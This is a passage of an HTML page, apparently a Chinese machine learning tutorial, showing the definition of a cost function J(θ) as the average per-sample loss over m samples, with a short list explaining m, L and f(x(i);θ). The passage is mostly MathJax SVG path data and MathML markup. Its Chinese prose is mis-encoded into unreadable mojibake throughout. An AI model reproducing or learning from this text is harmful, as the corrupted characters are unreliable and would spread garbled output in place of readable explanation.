Function)</h2><p>æˆæœ¬å‡½æ•°å°†å‘Šè¯‰æˆ‘ä»¬ï¼Œæ¨¡å‹çš„è¡¨ç°å¦‚ä½•ï¼Œä»¥ä¾¿ä½¿æˆ‘ä»¬å°è¯•ä½¿å…¶å˜å¾—æ›´å¥½ã€‚</p><p>æˆæœ¬å‡½æ•°å…¬å¼å¦‚ä¸‹ï¼š</p><mjx-container class="MathJax" jax="SVG" display="true" style="direction: ltr; display: block; text-align: center; margin: 1em 0; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -2.819ex;" xmlns="http://www.w3.org/2000/svg" width="31.783ex" height="6.354ex" role="img" focusable="false" viewbox="0 -1562.5 14048.2 2808.5" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43D" d="M447 625Q447 637 354 637H329Q323 642 323 645T325 664Q329 677 335 683H352Q393 681 498 681Q541 681 568 681T605 682T619 682Q633 682 633 672Q633 670 630 658Q626 642 623 640T604 637Q552 637 545 623Q541 610 483 376Q420 128 419 127Q397 64 333 21T195 -22Q137 -22 97 8T57 88Q57 130 80 152T132 174Q177 174 182 130Q182 98 164 80T123 56Q115 54 115 53T122 44Q148 15 197 15Q235 15 271 47T324 130Q328 142 387 380T447 625Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(633,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1022,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1491,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(2157.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mfrac" transform="translate(3213.6,0)"><g data-mml-node="mn" transform="translate(409,676)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(220,-686)"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><rect width="1078" height="60" x="120" y="220"/></g><g data-mml-node="munderover" transform="translate(4698.2,0)"><g data-mml-node="mo"><path data-c="2211" d="M60 948Q63 950 665 950H1267L1325 815Q1384 677 1388 669H1348L1341 683Q1320 724 1285 761Q1235 809 1174 838T1033 881T882 898T699 902H574H543H251L259 891Q722 258 724 252Q725 250 724 246Q721 243 460 -56L196 -356Q196 -357 407 -357Q459 -357 548 -357T676 -358Q812 -358 896 -353T1063 -332T1204 -283T1307 -196Q1328 -170 1348 -124H1388Q1388 -125 1381 -145T1356 -210T1325 -294L1267 -449L666 -450Q64 -450 61 -448Q55 -446 55 -439Q55 -437 57 -433L590 177Q590 178 557 222T452 366T322 544L56 909L55 924Q55 945 60 948Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(148.2,-1087.9) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(345,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z" style="stroke-width: 3;"/></g><g data-mml-node="mn" transform="translate(1123,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z" style="stroke-width: 3;"/></g></g><g data-mml-node="TeXAtom" transform="translate(411.6,1150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="TeXAtom" data-mjx-texclass="ORD" transform="translate(6308.9,0)"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(681,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(1070,0)"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(1620,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(2009,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(3458.1,0)"><path data-c="3B" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 85 94 103T137 121Q202 121 202 8Q202 -44 183 -94T144 -169T118 -194Q115 -194 106 -186T95 -174Q94 -171 107 -155T137 -107T160 -38Q161 -32 162 -22T165 -4T165 4Q165 5 161 4T142 0Q110 0 94 18T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(3902.7,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(4371.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(4983,0)"><path data-c="2212" d="M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(5983.2,0)"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(523,413) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(7350.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></g></svg><mjx-assistive-mml unselectable="on" display="block" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; overflow: hidden; width: 100%;"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><mi>J</mi><mo stretchy="false">(</mo><mi>Î¸</mi><mo stretchy="false">)</mo><mo>=</mo><mfrac><mn>1</mn><mi>m</mi></mfrac><munderover><mo data-mjx-texclass="OP">âˆ‘</mo><mrow data-mjx-texclass="ORD"><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow data-mjx-texclass="ORD"><mi>m</mi></mrow></munderover><mrow data-mjx-texclass="ORD"><mi>L</mi><mo stretchy="false">(</mo><mi>f</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>;</mo><mi>Î¸</mi><mo stretchy="false">)</mo><mo>âˆ’</mo><msup><mi>y</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo stretchy="false">)</mo></mrow></math></mjx-assistive-mml></mjx-container><ul><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="1.986ex" height="1.025ex" role="img" focusable="false" viewbox="0 -442 878 453" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D45A" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>m</mi></math></mjx-assistive-mml></mjx-container>ï¼šæ ·æœ¬æ•°é‡</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: 0;" xmlns="http://www.w3.org/2000/svg" width="1.541ex" height="1.545ex" role="img" focusable="false" viewbox="0 -683 681 683" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43F" d="M228 637Q194 637 192 641Q191 643 191 649Q191 673 202 682Q204 683 217 683Q271 680 344 680Q485 680 506 683H518Q524 677 524 674T522 656Q517 641 513 637H475Q406 636 394 628Q387 624 380 600T313 336Q297 271 279 198T252 88L243 52Q243 48 252 48T311 46H328Q360 46 379 47T428 54T478 72T522 106T564 161Q580 191 594 228T611 270Q616 273 628 273H641Q647 264 647 262T627 203T583 83T557 9Q555 4 553 3T537 0T494 -1Q483 -1 418 -1T294 0H116Q32 0 32 10Q32 17 34 24Q39 43 44 45Q48 46 59 46H65Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Q285 635 228 637Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>L</mi></math></mjx-assistive-mml></mjx-container>ï¼šå•ä¸ªæ ·æœ¬çš„æŸå¤±è®¡ç®—æ–¹å¼</li><li><mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.566ex;" xmlns="http://www.w3.org/2000/svg" width="8.35ex" height="2.587ex" role="img" focusable="false" viewbox="0 -893.3 3690.7 1143.3" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D453" d="M118 -162Q120 -162 124 -164T135 -167T147 -168Q160 -168 171 -155T187 -126Q197 -99 221 27T267 267T289 382V385H242Q195 385 192 387Q188 390 188 397L195 425Q197 430 203 430T250 431Q298 431 298 432Q298 434 307 482T319 540Q356 705 465 705Q502 703 526 683T550 630Q550 594 529 578T487 561Q443 561 443 603Q443 622 454 636T478 657L487 662Q471 668 457 668Q445 668 434 658T419 630Q412 601 403 552T387 469T380 433Q380 431 435 431Q480 431 487 430T498 424Q499 420 496 407T491 391Q489 386 482 386T428 385H372L349 263Q301 15 282 -47Q255 -132 212 -173Q175 -205 139 -205Q107 -205 81 -186T55 -132Q55 -95 76 -78T118 -61Q162 -61 162 -103Q162 -122 151 -136T127 -157L118 -162Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(550,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="msup" transform="translate(939,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z" style="stroke-width: 3;"/></g><g data-mml-node="TeXAtom" transform="translate(605,363) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mo"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(389,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(734,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g><g data-mml-node="mo" transform="translate(2388.1,0)"><path data-c="3B" d="M78 370Q78 394 95 412T138 430Q162 430 180 414T199 371Q199 346 182 328T139 310T96 327T78 370ZM78 60Q78 85 94 103T137 121Q202 121 202 8Q202 -44 183 -94T144 -169T118 -194Q115 -194 106 -186T95 -174Q94 -171 107 -155T137 -107T160 -38Q161 -32 162 -22T165 -4T165 4Q165 5 161 4T142 0Q110 0 94 18T78 60Z" style="stroke-width: 3;"/></g><g data-mml-node="mi" transform="translate(2832.7,0)"><path data-c="1D703" d="M35 200Q35 302 74 415T180 610T319 704Q320 704 327 704T339 705Q393 701 423 656Q462 596 462 495Q462 380 417 261T302 66T168 -10H161Q125 -10 99 10T60 63T41 130T35 200ZM383 566Q383 668 330 668Q294 668 260 623T204 521T170 421T157 371Q206 370 254 370L351 371Q352 372 359 404T375 484T383 566ZM113 132Q113 26 166 26Q181 26 198 36T239 74T287 161T335 307L340 324H145Q145 321 136 286T120 208T113 132Z" style="stroke-width: 3;"/></g><g data-mml-node="mo" transform="translate(3301.7,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: absolute; padding: 1px 0px 0px 0px; border: 0px; display: block; width: auto; overflow: hidden;"><math xmlns="http://www.w3.org/1998/Math/MathML"><mi>f</mi><mo stretchy="false">(</mo><msup><mi>x</mi><mrow data-mjx-texclass="ORD"><mo stretchy="false">(</mo><mi>i</mi><mo stretchy="false">)</mo></mrow></msup><mo>;</mo><mi>Î¸</mi><mo stretchy="false">)</mo></math></mjx-assistive-mml></mjx-container>ï¼šæ¨¡å‹å¯¹ç¬¬<mjx-container class="MathJax" jax="SVG" style="direction: ltr; position: relative;"><svg style="overflow: visible; min-height: 1px; min-width: 1px; vertical-align: -0.025ex;" xmlns="http://www.w3.org/2000/svg" width="0.781ex" height="1.52ex" role="img" focusable="false" viewbox="0 -661 345 672" aria-hidden="true"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z" style="stroke-width: 3;"/></g></g></g></svg><mjx-assistive-mml unselectable="on" display="inline" style="top: 0px; left: 0px; clip: rect(1px, 1px, 1px, 1px); -webkit-touch-callout: none; -webkit-user-select: none; -khtml-user-select: none; -moz-user-select: none; -ms-user-select: none; user-select: none; position: 